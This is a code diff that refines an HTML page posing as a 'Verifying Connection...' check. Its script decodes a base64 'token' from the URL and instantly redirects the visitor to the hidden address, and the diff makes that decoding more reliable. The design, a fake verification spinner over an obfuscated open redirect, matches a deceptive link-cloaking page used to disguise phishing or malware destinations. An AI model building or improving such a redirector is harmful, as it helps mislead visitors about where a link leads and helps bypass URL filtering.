@@ -1,34 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Verifying Connection...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { 
+            font-family: sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background: #f4f4f4; 
+            margin: 0;
+        }
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #3498db; 
+            border-radius: 50%; 
+            width: 30px; 
+            height: 30px; 
+            animation: spin 2s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
     </style>
 </head>
 <body>
     <div class="loader"></div>
     <script>
-    (function() {
-        const params = new URLSearchParams(window.location.search);
-        let token = params.get('t');
-        
-        if (token) {
-            try {
-                // Convert URL-safe base64 back to standard base64 if needed
-                token = token.replace(/-/g, '+').replace(/_/g, '/');
-                const target = atob(token);
-                
-                // Instant redirect
-                window.location.replace(target);
-            } catch (e) {
-                document.body.innerHTML = "Verification link expired or invalid.";
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            let token = params.get('t');
+            
+            if (token) {
+                try {
+                    // 1. Convert URL-safe characters back to standard Base64
+                    token = token.replace(/-/g, '+').replace(/_/g, '/');
+                    
+                    // 2. Fix potential padding issues
+                    while (token.length % 4) {
+                        token += '=';
+                    }
+                    
+                    // 3. Decode and redirect
+                    const target = atob(token);
+                    if (target.startsWith('http')) {
+                        window.location.replace(target);
+                    } else {
+                        throw new Error("Invalid Protocol");
+                    }
+                } catch (e) {
+                    console.error("Redirect error:", e);
+                    document.body.innerHTML = "Verification link expired or invalid.";
+                }
+            } else {
+                document.body.innerHTML = "No security token found.";
             }
-        }
-    })();
-</script>
+        })();
+    </script>
 </body>
 </html>
